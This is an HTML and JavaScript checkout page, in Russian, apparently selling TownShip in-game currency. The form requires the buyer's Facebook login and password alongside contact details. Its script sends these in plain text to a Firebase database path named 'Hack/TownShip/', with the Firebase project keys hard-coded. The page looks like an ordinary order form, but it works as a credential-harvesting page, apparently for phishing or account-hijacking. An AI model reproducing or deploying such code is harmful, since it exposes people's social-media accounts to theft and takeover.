<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Оформление заказа - TownShip</title>
    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- Font Awesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        body {
            background-color: #f8f9fa;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        .order-container {
            max-width: 800px;
            margin: 30px auto;
            background: white;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0,0,0,0.1);
            padding: 30px;
        }
        .order-header {
            border-bottom: 2px solid #3498db;
            padding-bottom: 15px;
            margin-bottom: 30px;
        }
        .order-title {
            color: #2c3e50;
            font-weight: 700;
        }
        .order-info {
            background: #f8f9fa;
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 30px;
        }
        .info-label {
            font-weight: 600;
            color: #7f8c8d;
        }
        .info-value {
            font-weight: 500;
            color: #2c3e50;
        }
        .form-section {
            margin-bottom: 30px;
        }
        .section-title {
            font-size: 1.2rem;
            font-weight: 600;
            color: #3498db;
            margin-bottom: 20px;
            padding-bottom: 10px;
            border-bottom: 1px dashed #ddd;
        }
        .form-label {
            font-weight: 500;
        }
        .btn-submit {
            background: #3498db;
            color: white;
            font-weight: 600;
            padding: 12px 30px;
            border: none;
            width: 100%;
        }
        .btn-submit:hover {
            background: #2980b9;
        }
        .success-message {
            display: none;
            text-align: center;
            padding: 30px;
        }
        .success-icon {
            font-size: 60px;
            color: #2ecc71;
            margin-bottom: 20px;
        }
        .required-field::after {
            content: " *";
            color: red;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="order-container">
            <!-- Шапка заказа -->
            <div class="order-header text-center">
                <h1 class="order-title"><i class="fas fa-shopping-cart"></i> Оформление заказа</h1>
                <p class="text-muted">Заполните форму ниже для завершения заказа</p>
            </div>

            <!-- Основная форма -->
            <div id="order-form">
                <!-- Информация о заказе -->
                <div class="order-info">
                    <div class="row">
                        <div class="col-md-6 mb-3">
                            <span class="info-label">Тариф:</span>
                            <span class="info-value" id="tariff-name">Загрузка...</span>
                        </div>
                        <div class="col-md-6 mb-3">
                            <span class="info-label">Дата и время:</span>
                            <span class="info-value" id="order-date">Загрузка...</span>
                        </div>
                    </div>
                    <div class="row">
                        <div class="col-md-6 mb-3">
                            <span class="info-label">Вы получите:</span>
                            <span class="info-value" id="product-amount">Загрузка...</span>
                        </div>
                        <div class="col-md-6 mb-3">
                            <span class="info-label">Стоимость:</span>
                            <span class="info-value">
                                <span id="product-price">Загрузка...</span> 
                                (<span id="product-price-rub">Загрузка...</span> руб)
                            </span>
                        </div>
                    </div>
                </div>

                <!-- Форма 1: Контактные данные -->
                <div class="form-section">
                    <h3 class="section-title"><i class="fas fa-user"></i> 1. Ваши контактные данные</h3>
                    <div class="mb-3">
                        <label for="email" class="form-label required-field">Email</label>
                        <input type="email" class="form-control" id="email" required>
                    </div>
                    <div class="mb-3">
                        <label for="phone" class="form-label required-field">Номер телефона</label>
                        <input type="tel" class="form-control" id="phone" required>
                    </div>
                </div>

                <!-- Форма 2: Информация об устройстве -->
                <div class="form-section">
                    <h3 class="section-title"><i class="fas fa-mobile-alt"></i> 2. Информация об устройстве</h3>
                    <div class="mb-3">
                        <label for="device-type" class="form-label required-field">Тип устройства</label>
                        <select class="form-select" id="device-type" required>
                            <option value="" selected disabled>Выберите тип устройства</option>
                            <option value="android">Android</option>
                            <option value="ios">iPhone (iOS)</option>
                        </select>
                    </div>
                    <div class="mb-3">
                        <label for="game-version" class="form-label required-field">Версия игры</label>
                        <input type="text" class="form-control" id="game-version" required>
                    </div>
                    <div class="mb-3">
                        <label for="comments" class="form-label">Комментарии (необязательно)</label>
                        <textarea class="form-control" id="comments" rows="2"></textarea>
                    </div>
                </div>

                <!-- Форма 3: Данные аккаунта -->
                <div class="form-section">
                    <h3 class="section-title"><i class="fas fa-key"></i> 3. Данные вашего аккаунта</h3>
                    <div class="mb-3">
                        <label for="account-type" class="form-label required-field">Тип аккаунта</label>
                        <select class="form-select" id="account-type" required>
                            <option value="" selected disabled>Выберите тип аккаунта</option>
                            <option value="Facebook">Facebook</option>
                        </select>
                    </div>
                    <div class="mb-3">
                        <label for="login" class="form-label required-field">Логин/Email/Телефон</label>
                        <input type="text" class="form-control" id="login" required>
                    </div>
                    <div class="mb-3">
                        <label for="password" class="form-label required-field">Пароль</label>
                        <input type="password" class="form-control" id="password" required>
                    </div>
                </div>

                <!-- Кнопка отправки -->
                <div class="form-section text-center">
                    <button type="button" class="btn btn-submit btn-lg" id="submit-order">
                        <i class="fas fa-paper-plane"></i> Оформить заказ
                    </button>
                </div>
            </div>

            <!-- Сообщение об успешной отправке -->
            <div id="success-message" class="success-message">
                <div class="success-icon">
                    <i class="fas fa-check-circle"></i>
                </div>
                <h2>Заказ успешно оформлен!</h2>
                <p class="lead">Мы получили ваш заказ и свяжемся с вами в ближайшее время в Telegram или WhatsApp.</p>
                <p>Номер вашего заказа: <strong id="order-id">#####</strong></p>
                <p>Обычно мы обрабатываем заказы в течение 1-12 часов.</p>
                <a href="index.html" class="btn btn-primary mt-3">
                    <i class="fas fa-home"></i> Вернуться на главную
                </a>
            </div>
        </div>
    </div>

    <!-- Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    
    <!-- Bootstrap JS -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>

    <script>
        // Инициализация Firebase (ЗАМЕНИТЕ НА СВОИ ДАННЫЕ)
        const firebaseConfig = {
            apiKey: "AIzaSyAeL_donbsrMtreNe1HTyXbpo8rko4VqBc",
			authDomain: "basegamesorders.firebaseapp.com",
			databaseURL: "https://basegamesorders-default-rtdb.firebaseio.com",
			projectId: "basegamesorders",
			storageBucket: "basegamesorders.firebasestorage.app",
			messagingSenderId: "469058322867",
			appId: "1:469058322867:web:2a0260076bb68ef88d4bc6",
			measurementId: "G-H44VJ1JH8X"
        };

        // Инициализация Firebase
        try {
            firebase.initializeApp(firebaseConfig);
            console.log("Firebase initialized successfully");
        } catch (error) {
            console.error("Firebase initialization error:", error);
        }

        const database = firebase.database();

        // Получаем параметры из URL
        const urlParams = new URLSearchParams(window.location.search);
        const productType = urlParams.get('type'); // 'Монеты', 'Звезды'
        const productId = urlParams.get('id'); // '1', '2'

        // Фиксированный курс доллара к рублю (можно заменить на API)
        const exchangeRate = 82;

        // Загрузка данных о продукте
        document.addEventListener('DOMContentLoaded', function() {
            // Устанавливаем дату и время
            const now = new Date();
            document.getElementById('order-date').textContent = 
                `${now.toLocaleDateString()} в ${now.toLocaleTimeString()}`;

            // Загружаем данные о продукте из Firebase
            if (productType && productId) {
                const productRef = database.ref(`TownShip/Orders/${productType}/${productType} - ${productId}`);
                
                productRef.once('value').then((snapshot) => {
                    const productData = snapshot.val();
                    if (productData) {
                        // Заполняем информацию о продукте
                        document.getElementById('tariff-name').textContent = productData.name;
                        document.getElementById('product-amount').textContent = productData.opis;
                        
                        // Обрабатываем цену
                        const dollarAmount = parseFloat(productData.sum.replace('$', '').trim());
                        const rubleAmount = Math.round(dollarAmount * exchangeRate);
                        
                        document.getElementById('product-price').textContent = `${dollarAmount} $`;
                        document.getElementById('product-price-rub').textContent = rubleAmount;
                    } else {
                        showError("Продукт не найден в базе данных");
                    }
                }).catch((error) => {
                    showError("Ошибка загрузки данных о продукте");
                    console.error("Ошибка загрузки продукта:", error);
                });
            } else {
                showError("Не указан тип или ID продукта");
            }

            // Обработчик отправки формы
            document.getElementById('submit-order').addEventListener('click', submitOrder);
        });

        // Функция отправки заказа
        function submitOrder() {
            // Проверяем обязательные поля
            if (!validateForm()) {
                return;
            }

            // Собираем данные формы
            const orderData = {
                // Информация о продукте
                productType: productType,
                productId: productId,
                productName: document.getElementById('tariff-name').textContent,
                productAmount: document.getElementById('product-amount').textContent,
                productPrice: document.getElementById('product-price').textContent,
                productPriceRub: document.getElementById('product-price-rub').textContent,
                orderDate: document.getElementById('order-date').textContent,
                
                // Контактные данные
                email: document.getElementById('email').value,
                phone: document.getElementById('phone').value,
                
                // Информация об устройстве
                deviceType: document.getElementById('device-type').value,
                gameVersion: document.getElementById('game-version').value,
                comments: document.getElementById('comments').value,
                
                // Данные аккаунта
                accountType: document.getElementById('account-type').value,
                login: document.getElementById('login').value,
                password: document.getElementById('password').value,
                
                // Дополнительная информация
                status: "new",
		game_order: "TownShip",
		game_order_send: "Сайт",    
                timestamp: firebase.database.ServerValue.TIMESTAMP
            };

            // Генерируем ID заказа
            const orderId = generateOrderId();
            document.getElementById('order-id').textContent = orderId;

            // Отправляем данные в Firebase
            database.ref('Hack/TownShip/' + orderId).set(orderData)
                .then(() => {
                    // Показываем сообщение об успехе
                    document.getElementById('order-form').style.display = 'none';
                    document.getElementById('success-message').style.display = 'block';
                    
                    // Можно также очистить форму или перенаправить пользователя
                })
                .catch((error) => {
                    alert("Произошла ошибка при отправке заказа. Пожалуйста, попробуйте еще раз.");
                    console.error("Ошибка отправки заказа:", error);
                });
        }

        // Валидация формы
        function validateForm() {
            let isValid = true;
            const requiredFields = [
                'email', 'phone', 'device-type', 'game-version', 
                'account-type', 'login', 'password'
            ];

            requiredFields.forEach(fieldId => {
                const field = document.getElementById(fieldId);
                if (!field.value.trim()) {
                    field.classList.add('is-invalid');
                    isValid = false;
                } else {
                    field.classList.remove('is-invalid');
                }
            });

            // Проверка email
            const email = document.getElementById('email').value;
            if (!/\S+@\S+\.\S+/.test(email)) {
                document.getElementById('email').classList.add('is-invalid');
                isValid = false;
            }

            if (!isValid) {
                alert("Пожалуйста, заполните все обязательные поля правильно.");
            }

            return isValid;
        }

        // Генерация ID заказа
        function generateOrderId() {
            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
            let result = '';
            for (let i = 0; i < 6; i++) {
                result += chars.charAt(Math.floor(Math.random() * chars.length));
            }
            return 'ORD-' + result;
        }

        // Показать ошибку
        function showError(message) {
            const errorDiv = document.createElement('div');
            errorDiv.className = 'alert alert-danger';
            errorDiv.textContent = message;
            document.querySelector('.order-info').prepend(errorDiv);
        }
    </script>
</body>
</html>
